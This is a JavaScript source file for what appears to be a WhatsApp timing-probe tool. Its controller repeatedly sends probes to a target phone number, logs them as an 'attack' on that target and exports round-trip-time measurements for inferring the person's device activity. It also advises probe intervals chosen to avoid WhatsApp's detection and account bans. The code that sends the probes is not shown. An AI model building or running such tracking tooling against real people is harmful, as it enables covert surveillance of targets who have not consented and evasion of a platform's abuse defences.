/**
 * Monitoring Controller
 * Manages monitoring sessions and probe scheduling
 */

const fs = require('fs');

class MonitoringController {
    constructor(connector, analyzer) {
        this.connector = connector;
        this.analyzer = analyzer;
        this.isMonitoring = false;
        this.config = {};
        this.intervalId = null;
        this.timeoutId = null;
    }

    /**
     * Start monitoring a target
     */
    async start(config, callbacks = {}) {
        if (this.isMonitoring) {
            throw new Error('Monitoring already in progress');
        }

        this.config = config;
        this.isMonitoring = true;

        const { onProbe, onComplete, onLog } = callbacks;

        // Warning for aggressive intervals
        if (config.interval < 5) {
            onLog?.(`⚠️ WARNING: ${config.interval}s interval is VERY AGGRESSIVE - High ban risk!`);
            onLog?.('⚠️ WhatsApp may detect and ban your account. Recommended: 15-30s');
        } else if (config.interval < 10) {
            onLog?.(`⚠️ Caution: ${config.interval}s interval may trigger detection. Recommended: 15-30s`);
        }

        onLog?.(`> INITIATING ATTACK: TARGET [${config.targetNumber}]`);

        // Send initial probe
        await this.sendProbe(onProbe, onLog);

        // Set up interval for subsequent probes
        this.intervalId = setInterval(async () => {
            if (!this.isMonitoring) {
                clearInterval(this.intervalId);
                return;
            }
            await this.sendProbe(onProbe, onLog);
        }, config.interval * 1000);

        // Auto-stop after duration
        this.timeoutId = setTimeout(() => {
            this.stop();
            onLog?.('Monitoring completed');
            this.exportResults();
            onComplete?.();
        }, config.duration * 60 * 1000);
    }

    /**
     * Send a single probe
     */
    async sendProbe(onProbe, onLog) {
        try {
            const probeData = await this.connector.sendProbe(this.config.targetNumber);
            probeData.deviceModel = this.config.deviceModel || 'Unknown';
            
            this.analyzer.registerProbe(probeData.messageId, probeData);
            console.log('Probe sent, message ID:', probeData.messageId);
            
            onProbe?.(probeData);
        } catch (error) {
            onLog?.(`Error sending probe: ${error.message}`);
        }
    }

    /**
     * Stop monitoring
     */
    stop() {
        this.isMonitoring = false;
        
        if (this.intervalId) {
            clearInterval(this.intervalId);
            this.intervalId = null;
        }
        
        if (this.timeoutId) {
            clearTimeout(this.timeoutId);
            this.timeoutId = null;
        }
        
        this.exportResults();
    }

    /**
     * Export results to JSON file
     */
    exportResults() {
        const filename = `rtt_measurements_${new Date().toISOString().replace(/:/g, '-')}.json`;
        fs.writeFileSync(filename, JSON.stringify({ 
            config: this.config,
            measurements: this.analyzer.getMeasurements()
        }, null, 2));
        
        return filename;
    }

    /**
     * Check if monitoring is active
     */
    isActive() {
        return this.isMonitoring;
    }

    /**
     * Get current config
     */
    getConfig() {
        return this.config;
    }
}

module.exports = MonitoringController;
